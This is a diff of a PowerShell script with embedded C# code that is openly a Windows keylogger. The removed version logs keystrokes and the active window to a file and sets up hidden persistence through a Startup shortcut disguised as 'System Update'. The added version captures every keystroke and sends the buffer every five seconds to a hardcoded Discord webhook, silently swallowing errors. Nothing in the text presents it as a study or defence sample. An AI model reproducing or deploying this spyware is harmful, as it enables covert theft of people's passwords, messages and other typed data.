@@ -1,46 +1,44 @@
-# Path where you want to save the PowerShell script
-$scriptName = "system_update.ps1"
-$scriptDir = "$env:APPDATA\SystemUpdate"
-if (-not (Test-Path $scriptDir)) {
-    New-Item -Path $scriptDir -ItemType Directory -Force
-}
-$scriptPath = Join-Path $scriptDir $scriptName
+# Your Discord webhook URL for receiving keystroke logs.
+$discordWebhookUrl = "https://discordapp.com/api/webhooks/1408110244558799019/nU-r_w_V3FtUCzX7cv08lV4MhVojEPR0cQ5XsP7dI-HuEDNRvr3gZOOwcRyZnjcmilgO"
 
-# PowerShell script content (the keylogger script)
-$scriptContent = @'
 Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName UIAutomationClient
-Add-Type -AssemblyName UIAutomationTypes
 
 Add-Type -TypeDefinition @"
 using System;
-using System.IO;
-using System.Text;
-using System.Diagnostics;
 using System.Runtime.InteropServices;
-using System.Windows.Automation;
+using System.Text;
+using System.Threading;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.Net.Http;
+using System.Threading.Tasks;
 
 namespace KeyLogger {
     public static class Program {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
 
-        private static readonly string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-        private static readonly string logFileName = Path.Combine(desktopPath, "keylog.txt");
-
-        private static StreamWriter logFile;
         private static HookProc hookProc = HookCallback;
         private static IntPtr hookId = IntPtr.Zero;
 
-        private static string currentContextKey = "";
+        private static StringBuilder buffer = new StringBuilder();
+        private static readonly object bufferLock = new object();
+
+        private static System.Timers.Timer sendTimer;
+
+        // Set your Discord webhook URL here
+        private static string discordWebhookUrl = """ + $discordWebhookUrl + @""";
 
         public static void Main() {
-            logFile = File.AppendText(logFileName);
-            logFile.AutoFlush = true;
+            // Start timer to send collected keys every 5 seconds
+            sendTimer = new System.Timers.Timer(5000);
+            sendTimer.Elapsed += (s, e) => SendBufferAsync().Wait();
+            sendTimer.AutoReset = true;
+            sendTimer.Start();
+
             hookId = SetHook(hookProc);
-            System.Windows.Forms.Application.Run();
+            Application.Run();
             UnhookWindowsHookEx(hookId);
-            logFile.Close();
         }
 
         private static IntPtr SetHook(HookProc proc) {
@@ -53,97 +51,36 @@ namespace KeyLogger {
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                 int vkCode = Marshal.ReadInt32(lParam);
-                WindowContext context = GetWindowContext();
-
-                string newContextKey = context.WindowTitle + "::" + context.WindowClass + "::" + context.FocusedElementName;
-
-                if (newContextKey != currentContextKey) {
-                    currentContextKey = newContextKey;
-
-                    string header;
-
-                    if (string.IsNullOrEmpty(context.WindowTitle) || context.WindowTitle == "Unknown") {
-                        if (IsChromeExtensionClass(context.WindowClass)) {
-                            header = "BROWSER EXTENSION POPUP";
-                        } else {
-                            header = "Unknown Window";
-                        }
-                    } else if (!string.IsNullOrEmpty(context.FocusedElementName) && IsLikelyExtensionInput(context.WindowClass, context.FocusedElementName)) {
-                        header = "BROWSER EXTENSION POPUP";
-                    } else {
-                        header = context.WindowTitle;
+                string key = ConvertKeyToString(vkCode);
+                if (!string.IsNullOrEmpty(key)) {
+                    lock(bufferLock) {
+                        buffer.Append(key);
                     }
-
-                    logFile.WriteLine();
-                    logFile.WriteLine("----- " + header + " -----");
-                }
-
-                string keyString = ConvertKeyToString(vkCode);
-                if (!string.IsNullOrEmpty(keyString)) {
-                    logFile.Write(keyString);
                 }
             }
             return CallNextHookEx(hookId, nCode, wParam, lParam);
         }
 
-        private struct WindowContext {
-            public string WindowTitle;
-            public string WindowClass;
-            public string FocusedElementName;
-        }
-
-        private static WindowContext GetWindowContext() {
-            WindowContext context = new WindowContext();
-
-            IntPtr hwnd = GetForegroundWindow();
-            context.WindowClass = GetClassName(hwnd);
-            context.WindowTitle = GetWindowTitleOrProcessName(hwnd);
-
-            string focusedName = "";
+        private static async Task SendBufferAsync() {
+            string dataToSend = null;
+            lock(bufferLock) {
+                if (buffer.Length == 0) return;
+                dataToSend = buffer.ToString();
+                buffer.Clear();
+            }
             try {
-                AutomationElement focusedElement = AutomationElement.FocusedElement;
-                if (focusedElement != null) {
-                    focusedName = focusedElement.Current.Name ?? "";
+                using (var client = new HttpClient()) {
+                    var content = new StringContent("{\"content\": \"" + EscapeForJson(dataToSend) + "\"}", Encoding.UTF8, "application/json");
+                    await client.PostAsync(discordWebhookUrl, content);
                 }
             } catch {
-                focusedName = "";
-            }
-            context.FocusedElementName = focusedName;
-
-            return context;
-        }
-
-        private static string GetWindowTitleOrProcessName(IntPtr hwnd) {
-            if (hwnd == IntPtr.Zero)
-                return "Unknown";
-
-            uint pid;
-            GetWindowThreadProcessId(hwnd, out pid);
-
-            if (pid == 0)
-                return "Unknown";
-
-            try {
-                Process p = Process.GetProcessById((int)pid);
-                string title = p.MainWindowTitle;
-                if (string.IsNullOrEmpty(title))
-                    title = p.ProcessName;
-
-                return string.IsNullOrEmpty(title) ? "Unknown" : title;
-            } catch {
-                return "Unknown";
+                // silently ignore exceptions to not disrupt keylogging
             }
         }
 
-        private static bool IsChromeExtensionClass(string className) {
-            if (string.IsNullOrEmpty(className))
-                return false;
-            return string.Equals(className, "Chrome_WidgetWin_1", StringComparison.OrdinalIgnoreCase)
-                   || string.Equals(className, "ExtensionPopup", StringComparison.OrdinalIgnoreCase);
-        }
-
-        private static bool IsLikelyExtensionInput(string className, string focusedElementName) {
-            return IsChromeExtensionClass(className) && !string.IsNullOrEmpty(focusedElementName);
+        // Escape for JSON string content
+        private static string EscapeForJson(string s) {
+            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "");
         }
 
         private static string ConvertKeyToString(int vkCode) {
@@ -156,17 +93,18 @@ namespace KeyLogger {
                 return upper ? c.ToString() : c.ToString().ToLower();
             }
             if (vkCode >= 0x30 && vkCode <= 0x39) {
-                if (shiftPressed) 
+                if (shiftPressed) {
                     return ShiftNumberToSymbol((char)vkCode);
-                else 
+                } else {
                     return ((char)vkCode).ToString();
+                }
             }
-            if (vkCode >= 0x60 && vkCode <= 0x69) 
+            if (vkCode >= 0x60 && vkCode <= 0x69) {
                 return (vkCode - 0x60).ToString();
-
+            }
             switch (vkCode) {
                 case 0x20: return " ";
-                case 0x0D: return Environment.NewLine;
+                case 0x0D: return "\n";
                 case 0x09: return "\t";
                 case 0x14: return null;
                 case 0xBD: return shiftPressed ? "_" : "-";
@@ -183,6 +121,7 @@ namespace KeyLogger {
                 default: return null;
             }
         }
+
         private static string ShiftNumberToSymbol(char number) {
             switch (number) {
                 case '1': return "!";
@@ -198,14 +137,7 @@ namespace KeyLogger {
                 default: return number.ToString();
             }
         }
-        private static string GetClassName(IntPtr hwnd) {
-            const int maxLength = 256;
-            StringBuilder classText = new StringBuilder(maxLength);
-            if (GetClassName(hwnd, classText, maxLength) > 0) {
-                return classText.ToString();
-            }
-            return "";
-        }
+
         [DllImport("user32.dll")]
         private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
         [DllImport("user32.dll")]
@@ -215,33 +147,9 @@ namespace KeyLogger {
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
         [DllImport("user32.dll")]
-        private static extern IntPtr GetForegroundWindow();
-        [DllImport("user32.dll")]
-        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
-        [DllImport("user32.dll")]
         private static extern short GetKeyState(int nVirtKey);
-        [DllImport("user32.dll", CharSet=CharSet.Auto)]
-        private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
     }
 }
-"@ -ReferencedAssemblies System.Windows.Forms,UIAutomationClient,UIAutomationTypes
-'@
+"@ -ReferencedAssemblies System.Windows.Forms
 
-# Save the script content to the file
-Set-Content -Path $scriptPath -Value $scriptContent -NoNewline -Encoding UTF8
-
-# Create shortcut in Startup folder
-$startupFolder = [Environment]::GetFolderPath("Startup")
-$shortcutPath = Join-Path $startupFolder "SystemUpdate.lnk"
-
-$wshShell = New-Object -ComObject WScript.Shell
-$shortcut = $wshShell.CreateShortcut($shortcutPath)
-
-$shortcut.TargetPath = "powershell.exe"
-$shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-$shortcut.WorkingDirectory = $scriptDir
-$shortcut.Description = "System Update Script"
-$shortcut.Save()
-
-Write-Output "Script saved to: $scriptPath"
-Write-Output "Startup shortcut created: $shortcutPath"
+[KeyLogger.Program]::Main()
